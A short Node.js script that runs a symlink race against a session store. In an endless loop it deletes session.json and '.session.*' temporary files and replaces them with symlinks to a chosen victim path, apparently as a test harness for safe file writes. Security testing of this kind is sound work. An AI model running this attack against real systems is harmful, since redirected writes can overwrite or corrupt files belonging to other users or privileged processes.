const fs = require("node:fs")
const [dir, victim, marker] = process.argv.slice(2)
fs.writeFileSync(marker, "ready")
for (;;) {
  try {
    for (const name of fs.readdirSync(dir)) {
      if (name !== "session.json" && !(name.startsWith(".session.") && name !== ".session.lock")) continue
      const candidate = `${dir}/${name}`
      try { fs.unlinkSync(candidate) } catch {}
      try { fs.symlinkSync(victim, candidate); fs.writeFileSync(`${marker}.attacked`, name) } catch {}
    }
  } catch {}
}
